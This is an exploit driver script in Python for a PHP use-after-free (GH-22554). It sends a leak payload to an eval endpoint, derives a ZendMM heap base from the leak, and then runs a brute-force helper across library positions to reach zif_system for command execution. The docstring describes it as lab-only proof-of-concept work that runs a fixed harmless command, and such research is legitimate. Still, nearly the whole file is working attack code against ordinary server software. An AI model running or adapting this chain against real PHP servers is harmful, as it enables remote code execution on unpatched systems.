#!/usr/bin/env python3
"""Plan B — in-band ZendMM seed (GH-22554) -> carrier -> zif_system -> id.

One request leaks a live ZendMM main-chunk pointer through a DOMXPath
foreign-document UAF (PHP 8.4.27; fixed in 8.5.12). ``main = leak & ~0x1FFFFF``
is calibration-free. libphp still has 32 possible positions in the 2 MiB slot
above main, so the driver scans those 32 (not the 512-slot window) and fires.

Lab harness: the leak payload is executed by an endpoint that evals PHP
(/eval.php in the labs). On a real target the same class of leak requires an
app that uses DOMXPath::registerPHPFunctionNS (the sink), not arbitrary PHP.

Usage:
  python3 poc/verify_vardestroy_xpathleak.py --target 127.0.0.1:18169 \\
      --container bf-leak-8427 --build 8.4.27

Lab-only; fixed benign `id>/tmp/vd`.
"""
import argparse
import base64
import os
import re
import subprocess
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from php2shell import profiles  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
LEAK_PHP = os.path.join(HERE, "verify_vardestroy_xpathleak.php")
LEAK_OLD = os.path.join(HERE, "verify_vardestroy_xpathleak_old.php")
BRUTE = os.path.join(HERE, "verify_vardestroy_bruteforce.py")


def _post_payload(host, port, path, php_file):
    code = open(php_file, "r", encoding="utf-8").read()
    code = re.sub(r"^\s*<\?php", "", code)   # eval endpoints take bare source
    body = urllib.parse.urlencode({"c": base64.b64encode(code.encode()).decode()})
    req = urllib.request.Request(f"http://{host}:{port}{path}", body.encode(),
                                 {"Content-Type": "application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode("latin-1")


def leak_main(host, port, path, api="auto"):
    """Leak main. `api`: auto (new then old), new (8.4+), old (8.2/8.3)."""
    payloads = {"new": [LEAK_PHP], "old": [LEAK_OLD],
                "auto": [LEAK_PHP, LEAK_OLD]}[api]
    last = None
    for pf in payloads:
        try:
            text = _post_payload(host, port, path, pf)
        except Exception as exc:  # noqa: BLE001
            last = exc
            continue
        m = re.search(r"main=([0-9a-f]+)", text)
        if not m:
            last = SystemExit(f"[!] no leak in response: {text[:160]!r}")
            continue
        main = int(m.group(1), 16)
        # a real leak is a canonical pointer (arm64 48-bit, x86_64 0x7f..);
        # the fixed 8.5.12 path returns attacker data (e.g. 0x6161..).
        if not (0x0000FFFF00000000 <= main <= 0x0000FFFFFFFFFFFF
                or 0x7F0000000000 <= main <= 0x7FFFFFFFFFFF):
            last = SystemExit(f"[!] leak {main:#x} is not a canonical pointer")
            continue
        return main
    raise SystemExit(str(last) if last else "no leak payload worked")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18169")
    ap.add_argument("--container", default="bf-leak-8427")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--leak-path", default="/eval.php")
    ap.add_argument("--leak-api", default="auto", choices=["auto", "new", "old"])
    ap.add_argument("--parallel", default="8")
    args = ap.parse_args()
    host, _, port = args.target.partition(":")
    port = int(port or 80)

    print(f"[1] GH-22554 in-band leak via {args.leak_path}")
    m = leak_main(host, port, args.leak_path, args.leak_api)
    print(f"    leaked main={m:#x}  carrier={m + 0x6A018:#x}")

    hi = m + 0x200000            # one 2 MiB slot: the 32 lib positions
    prof = profiles.find(php_version=args.build, arch="aarch64")
    deltas = (prof or {}).get("vd_carrier_deltas") or [(prof or {}).get("vd_carrier_delta")]
    deltas = [d for d in deltas if d is not None]
    print(f"[2] scan the 32 lib positions for main={m:#x} (no maps) then fire")
    for d in deltas:
        print(f"    delta={d:#x}")
        argv = [sys.executable, BRUTE, "--target", args.target,
                "--container", args.container, "--build", args.build,
                "--start", hex(m), "--hi", hex(hi), "--fast",
                "--parallel", str(args.parallel), "--delta", hex(d)]
        if subprocess.run(argv).returncode == 0:
            return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
